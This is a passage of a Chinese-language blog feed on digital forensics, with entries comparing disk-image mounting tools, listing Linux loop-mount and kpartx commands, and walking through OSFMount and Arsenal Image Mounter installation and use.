    <link href="https://xtpeeps.cn/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD%E5%B7%A5%E5%85%B7%E7%89%B9%E7%82%B9%E5%AF%B9%E6%AF%94%E8%A1%A8/"/>
    <id>https://xtpeeps.cn/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD%E5%B7%A5%E5%85%B7%E7%89%B9%E7%82%B9%E5%AF%B9%E6%AF%94%E8%A1%A8/</id>
    <published>2021-03-26T05:57:41.311Z</published>
    <updated>2021-03-26T05:57:41.311Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>工具名</th><th>支持的系统</th><th>收费情况</th><th>支持挂载镜像的格式</th></tr></thead><tbody><tr><td>Arsenal Image Mounter</td><td>win</td><td>收费，有破解工具</td><td>.dd(RAW).AFF4.E01/.Ex01 .VHD/VDI/XVA/VMDK/OVA.AVHD/AVHDX</td></tr><tr><td>GetData Mount Image Pro</td><td>win</td><td>收费</td><td>.AD1.DMG.E01/Ex01/L01/Lx01.aff.ISO .VHD/.VHDX.NUIX/MFS01ProDiscoverSMARTDD(RAW)VMWareXways</td></tr><tr><td>OSFMount</td><td>win</td><td>免费</td><td>.img/.dd.iso/.bin.00n.NRG.AFF.AFM.AFD.VMDK.E01.S01.VHD</td></tr><tr><td>Mount command</td><td>linux</td><td>linux自带</td><td>.raw/img/iso</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;工具名&lt;/th&gt;
&lt;th&gt;支持的系统&lt;/th&gt;
&lt;th&gt;收费情况&lt;/th&gt;
&lt;th&gt;支持挂载镜像的格式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Arsenal Image Mounter&lt;/td&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/mount_command/"/>
    <id>https://xtpeeps.cn/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/mount_command/</id>
    <published>2021-03-26T02:58:50.473Z</published>
    <updated>2021-03-26T02:59:01.712Z</updated>
    
    <content type="html"><![CDATA[<p>linux基本命令挂载镜像下一般使用mount命令挂载硬盘或镜像。目前没有找到相关取证类型的格式挂载方式。如E01，L01，AFF格式可能目前还需要windows进行挂载处理。</p><h1 id="支持的镜像格式："><a href="#支持的镜像格式：" class="headerlink" title="支持的镜像格式："></a>支持的镜像格式：</h1><ul><li>raw/img/iso</li></ul><h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><h2 id="常用的语句"><a href="#常用的语句" class="headerlink" title="常用的语句"></a>常用的语句</h2><p>df -Th 查看当前系统的分区情况</p><p>fdisk -l 查看当前系统分区信息详情</p><p>mount 挂载分区</p><p>unmount 卸载分区</p><h2 id="linux分区挂载点介绍"><a href="#linux分区挂载点介绍" class="headerlink" title="linux分区挂载点介绍"></a>linux分区挂载点介绍</h2><pre><code>/boot　 启动分区，一般设置100M-200M，boot目录包含了操作系统的内核和在启动系统过程中所要用到的文件/　　　  根分区,所有未指定挂载点的目录都会放到这个挂载点下/home　用户目录，一般每个用户100M左右，特殊用途，比如放大文件也可再加上G。分区大小取决于用户多少。对于多用户使用的电脑，建议把/home独立出来，而且还可以很好地控制普通用户权限等，比如对用户或者用户组实行磁盘配额限制、用户权限访问等./tmp　  临时文件目录，一般设置1-5G，方便加载ISO镜像文件使用，对于多用户系统或者网络服务器来也有独立挂载的必要。临时文件目录，也是最常出现问题的目录之一./usr　　系统资源，一般设置要3-15G，大部分的用户安装的软件程序都在这里。就像是Windows目录和Program Files目录。很多Linux家族系统有时还会把/usr/local单独作为挂载点使用。/var　　可变数据目录，包含系统运行时要改变的数据。通常这些数据所在的目录的大小是要经常变化的，系统日志记录也在/var/log下。一般多用户系统或者网络服务器要建立这个分区，设立这个分区，对系统日志的维护很有帮助。一般设置2-3G大小，也可以把硬盘余下空间全部分为var./srv　　系统服务目录,用来存放service服务启动所需的文件资料目录，不常改变。/opt　　附加应用程序目录，存放可选的安装文件，个人一般把自己下载的软件资料存在里面，比如Office、QQ等等.swap　 交换分区,一般为内存2倍，最大指定2G即可/bin　　二进制可执行目录，存放二进制可执行程序，里面的程序可以直接通过命令行调用，而不需要进入程序所在的文件夹/sbin　 系统管理员命令存放目录,存放标准系统管理员文件/dev　　存放设备文件,驱动文件等</code></pre><h1 id="挂载镜像方法："><a href="#挂载镜像方法：" class="headerlink" title="挂载镜像方法："></a>挂载镜像方法：</h1><h2 id="挂载raw格式镜像"><a href="#挂载raw格式镜像" class="headerlink" title="挂载raw格式镜像"></a>挂载raw格式镜像</h2><p>使用loop方式挂载raw格式镜像</p><p>虚拟机的镜像可以直接通过loop的方式来进行挂载，这种方式你必须先计算出镜像中每个分区的偏移量（fdisk -lu可查看），然后通过loop的方式的挂载，加上偏移量</p><pre><code>[root@centos images]# cd /var/lib/libvirt/images/[root@centos images]# fdisk -lu ubuntu.rawYou must set cylinders.You can do this from the extra functions menu.Disk ubuntu.raw: 0 MB, 0 bytes255 heads, 63 sectors/track, 0 cylinders, total 0 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x000ccae5     Device Boot      Start         End      Blocks   Id  Systemubuntu.raw1   *        2048    38862847    19430400   83  LinuxPartition 1 has different physical/logical endings:     phys=(1023, 254, 63) logical=(2419, 25, 38)ubuntu.raw2        38864894    40957951     1046529    5  ExtendedPartition 2 has different physical/logical beginnings (non-Linux?):     phys=(1023, 254, 63) logical=(2419, 58, 6)Partition 2 has different physical/logical endings:     phys=(1023, 254, 63) logical=(2549, 131, 14)ubuntu.raw5        38864896    40957951     1046528   82  Linux swap / Solaris[root@centos images]# echo $((2048*512))1048576[root@centos images]# mount -o loop,offset=1048576 ubuntu.raw /image/[root@centos images]# umount /image/</code></pre><h2 id="挂载img格式镜像"><a href="#挂载img格式镜像" class="headerlink" title="挂载img格式镜像"></a>挂载img格式镜像</h2><p>步骤：</p><ol><li>获取可以挂载的环回设备：</li></ol><pre><code>[root@virtserver ~]# losetup -f/dev/loop0</code></pre><ol><li>进行块设备挂载：</li></ol><pre><code>losetup /dev/loop0 abc.img</code></pre><ol><li>执行块设备的分区映射：</li></ol><pre><code>kpartx -a /dev/loop0</code></pre><ol><li>查看映射分区入口：</li></ol><pre><code>ls /dev/mapper/</code></pre><ol><li>通过fdisk -l查看磁盘情况。找到需要挂载的数据分区。</li><li>mount分区：</li></ol><pre><code>mount /dev/mapper/vg_lbrhel-lv_root /mnt/</code></pre><ol><li>卸载步骤：</li></ol><pre><code>1.umount2.kpartx -d3.losetup -d</code></pre><h2 id="挂载iso格式镜像"><a href="#挂载iso格式镜像" class="headerlink" title="挂载iso格式镜像"></a>挂载iso格式镜像</h2><ol><li>挂载</li></ol><pre><code>mount -t iso9660 -o loop /root/xxx.iso /mnt</code></pre><ol><li>查看</li></ol><pre><code>ls /mnt</code></pre><ol><li>卸载</li></ol><pre><code>umount /mnt</code></pre><h1 id="文章参考链接"><a href="#文章参考链接" class="headerlink" title="文章参考链接"></a>文章参考链接</h1><p><a href="https://blog.csdn.net/cnyyx/article/details/28302679">https://blog.csdn.net/cnyyx/article/details/28302679</a></p><p><a href="https://blog.csdn.net/klyhuntermax/article/details/51907856">https://blog.csdn.net/klyhuntermax/article/details/51907856</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;linux基本命令挂载镜像下一般使用mount命令挂载硬盘或镜像。目前没有找到相关取证类型的格式挂载方式。如E01，L01，AFF格式可能目前还需要windows进行挂载处理。&lt;/p&gt;
&lt;h1 id=&quot;支持的镜像格式：&quot;&gt;&lt;a href=&quot;#支持的镜像格式：&quot; class=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/"/>
    <id>https://xtpeeps.cn/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/</id>
    <published>2021-03-26T02:15:39.164Z</published>
    <updated>2021-04-24T09:38:13.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概况："><a href="#概况：" class="headerlink" title="概况："></a>概况：</h1><p>OSFMount允许将Windows中的本地磁盘镜像文件(整个磁盘或磁盘分区的逐位拷贝)作为物理磁盘或逻辑驱动器号挂载。然后，您可以使用PassMark OSForensics™来分析磁盘映像文件，方法是使用PassMark OSForensics™指定物理磁盘名称(例如，\.\PhysicalDrive1)或逻辑驱动器号(例如:Z:)。</p><p>默认情况下，映像文件被挂载为只读，因此原始映像文件不会被更改。</p><p>OSFMount支持在“写缓存”模式下以读写方式挂载磁盘镜像文件。它将所有的写操作存储到一个“写缓存”(或“增量”)文件中，该文件保存了原始磁盘映像文件的完整性。</p><p>OSFMount还支持创建RAM磁盘，基本上就是挂载到RAM中的磁盘。这通常比使用硬盘有很大的速度优势。因此，这对于需要高速磁盘访问的应用程序非常有用，比如数据库应用程序、游戏(如游戏缓存文件)和浏览器(缓存文件)。第二个好处是安全性，因为磁盘内容不是存储在物理硬盘上(而是存储在RAM中)，并且在系统关闭时，磁盘内容不是持久的。在撰写本文时，我们相信这是目前最快的RAM驱动软件。</p><p>OSFMount支持以.iso格式挂载CD的映像，当经常使用特定的CD并且访问速度很重要时这很有用。  </p><h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><img src="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/1616723284189-4dcf8f89-6aeb-4360-8890-4beef59bf29a.png" class="" title="image.png"><ul><li>支持的高级取证格式的版本是AFFv3与zlib压缩支持。不支持加密和签名。</li></ul><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>官方下载地址<a href="https://www.osforensics.com/tools/mount-disk-images.html">https://www.osforensics.com/tools/mount-disk-images.html</a></p><h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><p>Win 7 SP1, Win 8, Win 10</p><p>Windows Server 2008, 2012 (Windows Server 2016有问题)</p><p>64位支持(对于32位支持，请使用OSFMount v2)</p><p>用户必须具有管理员权限。</p><p>RAM: 1GB(挂载大磁盘映像时，RAM越多越好)</p><p>硬盘空间:15mb可用硬盘空间用于安装文件。</p><h1 id="支持镜像"><a href="#支持镜像" class="headerlink" title="支持镜像"></a>支持镜像</h1><ul><li>原始RAM镜像如dd</li><li>CD镜像如iso</li></ul><p>Ø 这里尝试E01镜像，注意耐心等待镜像制作完成（测试中发现存在后台延迟完成，前端显示完成情况），并且使用OSFMount挂载打开。（20200415验证发现当镜像制作中断或因磁盘空间不足导致中断都将，导致E01镜像无法挂载，并且E01的镜像是分很多小块保存的，测试中使用accessData FTK Imager无法挂载，但是OSFMount挂载成功）</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="使用OSFMount挂载镜像"><a href="#使用OSFMount挂载镜像" class="headerlink" title="使用OSFMount挂载镜像"></a>使用OSFMount挂载镜像</h2><img src="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/1616724747311-876d9d63-a6f2-4014-ba53-332f8d872514.png" class="" title="image.png"><p>点击mount now</p><img src="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/1616723778628-5c0d28fd-dc4e-4a49-95f1-6deaf6ab24c2.png" class="" title="image.png"><p>选择镜像挂载</p><img src="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/1616723817274-1cea19ed-a21d-4f1b-a729-848443544330.png" class="" title="image.png"><p>这里选择选择readonly</p><img src="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/1616723827278-21f22357-cd87-4556-9efb-cc02a5e110a3.png" class="" title="image.png"><p>点击mount即可</p><img src="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/image-20210326135334373.png" class="" title="image-20210326135334373">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概况：&quot;&gt;&lt;a href=&quot;#概况：&quot; class=&quot;headerlink&quot; title=&quot;概况：&quot;&gt;&lt;/a&gt;概况：&lt;/h1&gt;&lt;p&gt;OSFMount允许将Windows中的本地磁盘镜像文件(整个磁盘或磁盘分区的逐位拷贝)作为物理磁盘或逻辑驱动器号挂载。然后，您可以</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/"/>
    <id>https://xtpeeps.cn/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/</id>
    <published>2021-03-23T15:06:11.330Z</published>
    <updated>2021-04-24T09:37:50.228Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>分子实验室 <a href="https://molecule-labs.com/">https://molecule-labs.com/</a></p></blockquote><p>官网：<a href="https://arsenalrecon.com/">https://arsenalrecon.com/</a></p><p>工具源码：<a href="https://github.com/ArsenalRecon/Arsenal-Image-Mounter">https://github.com/ArsenalRecon/Arsenal-Image-Mounter</a></p><p>Arsenal Image Mounter(AIM)包含了一个虚拟SCSI适配器（通过独特的Storport miniport驱动程序），使用户可以从Windows中对挂载的镜像启动虚拟机（然后绕过Windows身份验证）、管理BitLocker -受保护的卷、安装/访问“卷影副本”、“磁盘管理器”等功能。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>完成安装在Windows上将原始、检查和虚拟机磁盘映像的内容挂载为完整或“真实”磁盘</li><li>临时写支持、“假”磁盘签名、CLI版本、虚拟机启动、Windows身份验证旁路、BitLocker管理等等</li><li>在磁盘映像中快速挂载所有卷影副本(VSCs)</li><li>假设已安装适当的Windows文件系统驱动程序，则磁盘映像中包含的许多类型的文件系统都可以安装在运行AIM的取证工作站上。阿森纳安装的文件系统包括NTFS，FAT32，ReFS，exFAT，HFS +，UFS和EXT3。</li><li>AIM还支持绕过Windows文件系统驱动程序，并通过“ Windows文件系统驱动程序绕过”安装选项使用DiscUtils文件系统驱动程序。该挂载选项支持的文件系统包括FAT 12/16/32和NTFS，具有对Btrfs，Ext2 / 3/4的实验性支持（某些最新Linux发行版使用64位头字段除外），ExFAT，HFS +，SquashFs ，UDF和XFS。</li></ul><h2 id="支持挂载的镜像类型"><a href="#支持挂载的镜像类型" class="headerlink" title="支持挂载的镜像类型"></a>支持挂载的镜像类型</h2><ul><li>原始（dd）</li><li>高级取证格式4（AFF4）</li><li>Encase（E01和Ex01）（如果libewf可用）</li><li>如果DiscUtils可用，则虚拟机磁盘文件（VHD，VDI，XVA，VMDK，OVA）和检查点（AVHD，AVHDX）</li></ul><h2 id="运行要求"><a href="#运行要求" class="headerlink" title="运行要求"></a>运行要求</h2><p>Arsenal Image Mounter设计为（理想情况）在Windows 10（和Server 2016/2019）x64上运行，以便所有功能（例如，启动虚拟机和与BitLocker相关的功能）都能按预期工作。在上述推荐的操作系统之外，大多数（如果不是全部）AIM的核心功能仅在Windows 7和Server 2012/2012 R2 x64上才可在Windows系统上使用。</p><p>Arsenal Image Mounter需要Hyper-V才能启动虚拟机。如果您尚未安装Hyper-V，请按照以下链接中提供的说明启用它：</p><p><a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v">https://docs.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v</a></p><p>另外，请确保已启用工作站BIOS或UEFI中的虚拟化技术设置。还建议您在防病毒应用程序中排除Arsenal Image Mounter的文件夹和/或可执行文件。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装流程"><a href="#安装流程" class="headerlink" title="安装流程"></a>安装流程</h3><p>官网下载地址：<a href="https://arsenalrecon.com/downloads/">https://arsenalrecon.com/downloads/</a></p><p>下载AIM后，将“ Arsenal-Image-Mounter…” ZIP文件的内容提取到您选择的文件夹中。AIM文件夹的内容包括可执行文件“ ArsenalImageMounter.exe”（GUI版本），“ aim_cli.exe”（CLI版本）以及AIM的GUI和CLI版本的自述文件。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480660964-5d035969-a794-4ce2-b2b9-962f94d73003.png" class="" title="image.png"><p>自述文件包含有关AIM功能和产品使用的详细说明。强烈建议数字法医从业人员查看并了解“ readme.txt”和“ readme_cli.txt”中提供的信息。</p><p>双击“ ArsenalImageMounter.exe”打开AIM将启动AIM并安装AIM驱动程序。如果您看到以下与安装更新的驱动程序有关的窗口，请选择“是”。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480663552-f3028381-993b-4eeb-9e21-eeff6fe69d00.png" class="" title="image.png"><p>将会出现“正在安装驱动程序”消息窗口。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480660984-89df74f3-28a9-41c1-a68d-bd016714ab4f.png" class="" title="image"><p>驱动程序设置完成后，将显示“驱动程序已成功安装”消息窗口。 </p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480662011-d1af66cf-fd52-4aac-b1e5-4bb7be4d9388.png" class="" title="image"><p>1、下载的是压缩包文件，解压后运行；</p><p>2、支持32位、64位运行环境；</p><p>3、需要<strong>Microsoft .Net Framework 4.0</strong>环境</p><p>4、如果软件无法正常打开，请以“<strong>管理员</strong>”身份运行；</p><h3 id="启用AIM的专业模式"><a href="#启用AIM的专业模式" class="headerlink" title="启用AIM的专业模式"></a><strong>启用AIM的专业模式</strong></h3><p>通过在AIM首次启动时激活许可证或通过“帮助”-&gt;“关于”，可以在连接Internet的工作站上启用AIM的“专业模式”。</p><p>要在有气隙的工作站上启用AIM的“专业模式”，请：</p><ul><li>打开Arsenal Image Mounter并输入获得的许可证代码</li><li>意识到没有可用的Internet连接后，Arsenal Image Mounter会将一个“ .LIC”文件保存到您的ProgramData\ArsenalRecon文件夹中</li><li>在可访问Internet的工作站上，转到<a href="https://www.softworkz.com/offline/offline.aspx%E4%B8%8A%E7%9A%84%E2%80%9C%E8%84%B1%E6%9C%BA%E6%BF%80%E6%B4%BB%E2%80%9D%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0%E2%80%9C">https://www.softworkz.com/offline/offline.aspx上的“脱机激活”页面，然后上传“</a> .LIC”文件。</li><li>将收到的CDM文件复制到ProgramData\ArsenalRecon文件夹</li><li>打开Arsenal Image Mounter并确认它现在正在专业模式下运行</li></ul><h3 id="免费版和专业版区别"><a href="#免费版和专业版区别" class="headerlink" title="免费版和专业版区别"></a>免费版和专业版区别</h3><p><strong>自由模式</strong></p><ul><li>在Windows上将原始，取证和虚拟机磁盘映像挂载为“真实”磁盘</li><li>对所有受支持的磁盘映像格式的可重复播放delta 文件提供临时写入支持</li><li>将“物理”安装的对象保存为各种磁盘映像格式</li><li>虚拟挂载镜像</li><li>创建RAM磁盘</li><li>命令行界面（CLI）可执行文件</li><li>MBR注入，“假”磁盘签名，可移动磁盘仿真等</li></ul><p><strong>专业模式</strong></p><ul><li>提供所有免费模式功能，以及：</li><li>轻松启动（并经常登录）虚拟机</li><li>通过可选的Windows NTFS驱动程序绕过卷影复制安装</li><li>Windows文件系统驱动程序绕过对磁盘映像安装的支持</li><li>虚拟安装档案和目录</li><li>使用完全解密的BitLocker卷保存磁盘映像</li></ul><h2 id="磁盘挂载"><a href="#磁盘挂载" class="headerlink" title="磁盘挂载"></a>磁盘挂载</h2><p>这里由于已有老师进行了相关教程的介绍，这里做了引用和整合，感谢老师们的前沿探索。</p><h3 id="快速上手教程-在Win中挂载映像为磁盘"><a href="#快速上手教程-在Win中挂载映像为磁盘" class="headerlink" title="快速上手教程-在Win中挂载映像为磁盘"></a>快速上手教程-在Win中挂载映像为磁盘</h3><p>参考文章：<a href="https://blog.csdn.net/NDASH/article/details/110292699">https://blog.csdn.net/NDASH/article/details/110292699</a></p><p>1、软件运行后，提示启动信息，点击“ok”</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616478361537-1a4abce5-c6b4-4242-b01d-f23bce22128f.png" class="" title="image.png"><p>2、选择磁盘镜像</p><p>路径：File-&gt;Mount disk image File</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616478371765-eb280065-d4f9-4d14-a81f-82856459dd48.png" class="" title="image.png"><p>3、镜像模式设置</p><p>〇只读磁盘设备</p><p>将磁盘映像作为只读磁盘设备挂载。不允许写操作。</p><p>〇写入临时磁盘设备</p><p>将磁盘映像作为可写磁盘设备挂载。修改将被写入一个写-覆盖差异文件，原始磁盘映像将不会被改变。有时也称为写覆盖或写复制模式。</p><p> 指定另一个不同的文件位置</p><p>仿真镜像的话就需要设置读写模式才行。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616478376998-fa78d4a7-7f1e-43de-9ba2-7912229c8d68.png" class="" title="image.png"><p>4、磁盘信息</p><p>挂载成功后，在软件的界面上会显示出每个挂载的设备信息，包括ID、磁盘状态（联机或脱机）、驱动器号、分区类型、磁盘签名信息、大小，模式（只读或读写），驱动器类型（固定或移动）。</p><p>您还可以在界面的下半部分中选择继续添加镜像、启动虚拟机和删除镜像等其他功能选项。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616478408231-b1d9fa3c-e72c-481e-8147-16ca651ff81a.png" class="" title="image.png"><p>5、挂载之后在磁盘管理显示</p><p>可在磁盘管理中查看挂载好的磁盘。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616478410102-8ba9d888-b93e-4790-8cc1-a9d3dadfb912.png" class="" title="image.png"><p>高级功能-更改磁盘挂载模式</p><p>特别方便的一点是，Arsenal Image Mounter可以直接对已经挂载的镜像在“高级功能”再设置就可以更改模式，不需要像FTK Imager需要重新再挂载镜像，而且速度很快。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616478416660-41c74f61-5ce0-4c17-8c00-4c2344d66d58.png" class="" title="image.png"><p>点击只读设置，磁盘管理查看磁盘就会变成只读模式。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616478429017-f1a032fe-c722-4a16-8939-0679ef9eb2e8.png" class="" title="image.png"><h3 id="官方教程-挂载磁盘映像"><a href="#官方教程-挂载磁盘映像" class="headerlink" title="官方教程-挂载磁盘映像"></a>官方教程-挂载磁盘映像</h3><p><a href="https://arsenalrecon.com/2020/12/arsenal-image-mounter-aim-walkthrough/">https://arsenalrecon.com/2020/12/arsenal-image-mounter-aim-walkthrough/</a></p><p>**<br>**</p><ol><li>双击“ ArsenalImageMounter.exe”启动AIM，然后从“文件”菜单中选择“文件”-&gt;“挂载磁盘映像文件”。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480822639-fe208635-7182-41ee-8273-8d68123ec708.png" class="" title="image"><ol><li>选择AIM挂载的磁盘映像类型。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480758382-10b8ec42-2d7b-43e4-9172-9e3e56f84418.png" class="" title="image"><ol><li>选择磁盘映像后，将出现“挂载选项”窗口，并选择了“只读磁盘设备”安装选项。在本文中，我们将重点介绍“写入临时磁盘设备”安装选项，因此我们将选择“写入临时磁盘设备”，然后按“确定”。在AIM安装选项窗口中描述了写入临时安装选项的效果。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480822728-4accc189-a866-4d31-8da8-2d7cfaadf1a9.png" class="" title="image"><p>装入磁盘映像文件后，将在AIM的主界面中标识运行AIM的取证工作站上的挂载点。在这种情况下，具有临时读/写功能的’c16-Hunter.dd’被安装为’H:&#39;。您还可以看到该磁盘映像包含两个卷影副本（VSC）。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480822195-515cf145-c502-4b23-80c2-3de533b97c06.png" class="" title="image"><p>在Windows资源管理器中，您可以浏览到“本地磁盘（H :)”，如下所示。</p><img 